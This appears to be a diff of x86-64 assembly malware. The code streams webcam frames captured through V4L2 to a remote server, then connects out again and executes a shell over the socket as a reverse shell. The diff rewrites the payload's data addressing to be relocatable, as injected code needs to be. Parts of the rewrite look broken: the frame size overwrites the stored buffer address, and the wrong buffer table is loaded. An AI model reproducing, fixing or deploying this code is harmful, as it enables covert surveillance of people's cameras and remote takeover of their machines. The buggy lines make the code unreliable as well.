@@ -1,6 +1,8 @@
 		mov		rax, SYS_connect
 		mov		rdi, r13
-		lea		rsi, [rel serv_addr_video]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.serv_addr_video
+		;lea		rsi, [rel serv_addr_video]
 		mov		rdx, 16
 		syscall
 		test	rax, rax
@@ -13,52 +15,76 @@
 		;	__u32 reserved[2];    //
 		;};
 		; struct v4l2_buffer
-		mov		dword [rel reqb], NBUF
-		mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
+
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.reqb
+		mov		dword [rdx], NBUF
+		mov		dword [rdx + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [rdx + 8], V4L2_MEMORY_MMAP
+
+		;mov		dword [rel reqb], NBUF
+		;mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		;mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
+
 		xor		eax, eax
-		mov		[reqb + 12], eax
+		mov		[rdx + 12], eax
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_REQBUFS
-		lea		rdx, [rel reqb]
+		;lea		rdx, [rel reqb]
 		syscall
 
 %assign i 0
 %rep NBUF
-		mov		dword [rel v4buf], i
-		mov		dword [rel v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [rel v4buf + 60], V4L2_MEMORY_MMAP
+
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.v4buf
+
+		mov		dword [rdx], i
+		mov		dword [rdx + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [rdx + 60], V4L2_MEMORY_MMAP
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_QUERYBUF
-		lea		rdx, [rel v4buf]
+		;lea		rdx, [rel v4buf]
 		syscall
+
+		mov		r9, [rbp + 16]
+		add		r9, mydata.v4buf
 
 		mov		rax, SYS_mmap
 		xor		rdi, rdi                          ; addr = NULL
-		mov		edx, [rel v4buf + 72]                 ; length (dword) → edx
+		mov		edx, [r9 + 72]                 ; length (dword) → edx
 		mov		esi, edx                          ; rsi = length
 		mov		edx, PROT_READ | PROT_WRITE       ; rdx
 		mov		r10, MAP_SHARED
 		mov		r8,  r12                          ; fd
-		mov		r9,  [rel v4buf + 64]                 ; offset (qword)
+		mov		r9,  [r9 + 64]                 ; offset (qword)
 		syscall
-		mov		[rel buf_addrs + i*8], rax            ; save address
-		mov		eax, [rel v4buf + 72]
-		mov		[rel buf_sizes + i*8], rax            ; save size (dword → qword)
+
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.v4buf
+
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.buf_addrs
+
+		mov		[rsi + i*8], rax            ; save address
+		mov		eax, [rdx + 72]
+		mov		[rsi + i*8], rax            ; save size (dword → qword)
 
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_QBUF
-		lea		rdx, [rel v4buf]
+		;lea		rdx, [rel v4buf]
 		syscall
 %assign i i+1
 %endrep
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_STREAMON
-		lea		rdx, [rel cap_type]
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.cap_type
+		;lea		rdx, [rel cap_type]
 		syscall
 
 		mov		rcx, FRAMES
@@ -67,12 +93,20 @@
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_DQBUF
-		lea		rdx, [rel v4buf]
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.v4buf
+		;lea		rdx, [rel v4buf]
 		syscall
 
-		mov		ebx, [rel v4buf]                      ; index (dword)
-		mov		edx, [rel v4buf + 8]                  ; bytesused
-		lea		rcx, [rel buf_addrs]
+
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.v4buf
+
+		mov		ebx, [rdx]                      ; index (dword)
+		mov		edx, [rdx + 8]                  ; bytesused
+		mov		rcx, [rbp + 16]
+		add		rcx, mydata.v4buf
+		;lea		rcx, [rel buf_addrs]
 		mov		rsi, [rcx + rbx*8]          ; addr
 		mov		rdi, r13                          ; stdout
 		mov		rax, SYS_write
@@ -81,7 +115,9 @@
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_QBUF
-		lea		rdx, [rel v4buf]
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.v4buf
+		;lea		rdx, [rel v4buf]
 		syscall
 		pop		rcx
 		loop	.loop_frames
@@ -89,14 +125,20 @@
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_STREAMOFF
-		lea		rdx, [rel cap_type]
+		mov		rdx, [rbp + 16]
+		add		rdx, mydata.cap_type
+		;lea		rdx, [rel cap_type]
 		syscall
 
 %assign i 0
 %rep NBUF
 		mov		rax, SYS_munmap
-		mov		rdi, [rel buf_addrs + i*8]
-		mov		rsi, [rel buf_sizes + i*8]
+		mov		rdi, [rbp + 16]
+		add		rdi, mydata.buf_addrs
+		mov		rdi, [rdi + i*8]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.buf_sizes
+		mov		rsi, [rsi + i*8]
 		syscall
 %assign i i+1
 %endrep
@@ -124,7 +166,9 @@
 
 		mov		rax, SYS_connect
 		mov		rdi, r12
-		lea		rsi, [rel serv_addr]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.serv_addr
+		;lea		rsi, [rel serv_addr]
 		mov		rdx, 16
 		syscall
 		test	rax, rax
@@ -142,11 +186,21 @@
 		mov		rdi, r12
 		mov		rsi, 2
 		syscall
-		lea		rax, [rel arg0]
-		mov		[rel argv], rax
+		mov		rax, [rbp + 16]
+		add		rax, mydata.arg0
+		;lea		rax, [rel arg0]
+		mov		rdi, [rbp + 16]
+		add		rdi, mydata.argv
+		mov		[rdi], rax
+
 		mov		rax, SYS_execve
-		lea		rdi, [rel shell]
-		lea		rsi, [rel argv]
+
+		mov		rdi, [rbp + 16]
+		add		rdi, mydata.shell
+		;lea		rdi, [rel shell]
+		mov		rsi, [rbp + 16]
+		add		rsi, mydata.argv
+		;lea		rsi, [rel argv]
 		xor		rdx, rdx
 		NOP
 		NOP
